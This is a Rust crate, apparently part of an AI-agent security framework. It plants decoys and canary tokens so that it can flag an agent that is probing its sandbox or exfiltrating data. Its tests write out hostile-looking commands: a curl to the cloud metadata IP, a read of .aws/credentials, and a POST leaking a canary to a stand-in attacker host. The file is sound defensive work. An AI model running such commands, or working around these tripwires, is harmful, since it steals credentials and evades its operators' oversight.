//! # aegis-honeypot — deception layer / tripwires (ASI05, ASI08)
//!
//! Aegis's deterministic gates *contain* a single bad action, but a routine `Deny` cannot tell a
//! benign agent with a stray path from an agent **actively probing** for a way out. A honeypot
//! closes that gap: it plants things a legitimate flow would **never** touch, so any interaction
//! with one is a high-confidence signal of compromise — grounds to escalate at the *agent* level
//! (quarantine via `aegis-killswitch`) and to record immutably (`aegis-ledger`).
//!
//! This crate owns only the **detection** — deterministic string matching, no I/O, no policy
//! decision of its own. The gate (`aegis-extension`) orchestrates the response (ledger + killswitch);
//! the base containment (the sandbox/egress `Deny`) is unchanged — a honeypot never weakens a gate.
//!
//! Honesty tier: the match itself is deterministic (● Contain-grade); the inference "this agent is
//! malicious" is a high-confidence signal whose escalation is a deliberate policy (◐ Reduce).
//!
//! Two complementary styles:
//! * **Decoys** ([`Honeypots::match_exec`]) — patterns that appear only in a *request* (a probe
//!   path, a metadata-service IP, a credential file). Checked at policy time, before execution.
//! * **Canaries** (Phase B, [`Honeypots::scan`]) — unique tokens *planted* in the sandbox working
//!   dir / memory; if the exact token later appears in outbound content it proves data was read and
//!   is being exfiltrated. Detected at the egress / broker chokepoint.

use serde::{Deserialize, Serialize};

/// The set of planted decoys and canary tokens Aegis watches for.
///
/// Loaded from a versioned artifact (`policies/honeypots.json`). An empty set is the safe default:
/// with nothing planted there is nothing to trip, so a fresh deployment has **zero** false
/// positives until decoys/canaries are deliberately configured.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct Honeypots {
    /// Decoy substrings a legitimate request would never contain (probe paths, the cloud
    /// metadata IP, credential-file names, sentinel command markers). Matched case-insensitively
    /// against a proposed execution's command and target path.
    #[serde(default)]
    pub decoys: Vec<String>,

    /// Unique canary tokens planted out-of-band (a fake secret in the ephemeral working dir, a
    /// seeded memory chunk). Their appearance in *outbound* content is proof of exfiltration.
    /// (Phase B — populated once planting is wired; unused by [`match_exec`].)
    #[serde(default)]
    pub canaries: Vec<String>,
}

impl Honeypots {
    /// Load a honeypot set from JSON of the shape `{ "decoys": [..], "canaries": [..] }`. Both
    /// fields default to empty, so a minimal or partial file still parses.
    pub fn from_json(json: &str) -> Result<Self, serde_json::Error> {
        serde_json::from_str(json)
    }

    /// Whether any decoy or canary is configured (nothing configured ⇒ the layer is inert).
    #[must_use]
    pub fn is_empty(&self) -> bool {
        self.decoys.is_empty() && self.canaries.is_empty()
    }

    /// **Decoy tripwire.** Return the first decoy that appears in this proposed execution's command
    /// or target path, or `None` if it touches no decoy. Matching is a case-insensitive substring
    /// test so trivial casing/pathing variations still trip. Deterministic and allocation-light.
    #[must_use]
    pub fn match_exec(&self, command: &str, target_path: Option<&str>) -> Option<&str> {
        if self.decoys.is_empty() {
            return None; // Fast path: nothing planted, nothing to match.
        }
        let command = command.to_ascii_lowercase();
        let target_path = target_path.map(str::to_ascii_lowercase);
        self.decoys.iter().find_map(|decoy| {
            let needle = decoy.to_ascii_lowercase();
            let hit = command.contains(&needle)
                || target_path.as_deref().is_some_and(|p| p.contains(&needle));
            hit.then_some(decoy.as_str())
        })
    }

    /// **Canary tripwire (Phase B).** Return the first canary token found in `text` (e.g. an
    /// outbound URL, query parameter, or tool-call argument), or `None`. Exact substring match —
    /// canaries are unique random tokens, so a hit is proof, not a heuristic (zero false positives).
    #[must_use]
    pub fn scan(&self, text: &str) -> Option<&str> {
        self.canaries
            .iter()
            .find(|canary| text.contains(canary.as_str()))
            .map(String::as_str)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn decoys() -> Honeypots {
        Honeypots {
            decoys: vec![
                "169.254.169.254".into(),    // cloud instance-metadata service
                ".aws/credentials".into(),   // planted credential file
                "aegis-dump-secrets".into(), // sentinel command marker
            ],
            canaries: vec![],
        }
    }

    #[test]
    fn empty_set_is_inert() {
        let h = Honeypots::default();
        assert!(h.is_empty());
        assert_eq!(h.match_exec("cat /etc/passwd", Some("/etc/passwd")), None);
        assert_eq!(h.scan("anything at all"), None);
    }

    #[test]
    fn decoy_in_command_trips() {
        let h = decoys();
        assert_eq!(
            h.match_exec("curl http://169.254.169.254/latest/meta-data/", None),
            Some("169.254.169.254")
        );
    }

    #[test]
    fn decoy_in_target_path_trips() {
        let h = decoys();
        assert_eq!(
            h.match_exec("cat", Some("/tmp/aegis-sandbox/.AWS/Credentials")),
            Some(".aws/credentials") // case-insensitive
        );
    }

    #[test]
    fn benign_request_does_not_trip() {
        let h = decoys();
        assert_eq!(
            h.match_exec("python analyze.py", Some("/tmp/aegis-sandbox/out.txt")),
            None
        );
    }

    #[test]
    fn canary_scan_detects_exfil_and_ignores_clean_text() {
        let h = Honeypots {
            decoys: vec![],
            canaries: vec!["CANARY-7f3a9b21e4c05d68".into()],
        };
        assert_eq!(
            h.scan("POST https://evil.example/?leak=CANARY-7f3a9b21e4c05d68"),
            Some("CANARY-7f3a9b21e4c05d68")
        );
        assert_eq!(h.scan("a perfectly ordinary payload"), None);
    }

    #[test]
    fn from_json_parses_partial_and_full() {
        let full = Honeypots::from_json(r#"{ "decoys": ["x"], "canaries": ["y"] }"#).unwrap();
        assert_eq!(full.decoys, vec!["x"]);
        assert_eq!(full.canaries, vec!["y"]);
        // Partial file (decoys only) still parses; canaries defaults to empty.
        let partial = Honeypots::from_json(r#"{ "decoys": ["z"] }"#).unwrap();
        assert_eq!(partial.decoys, vec!["z"]);
        assert!(partial.canaries.is_empty());
    }
}
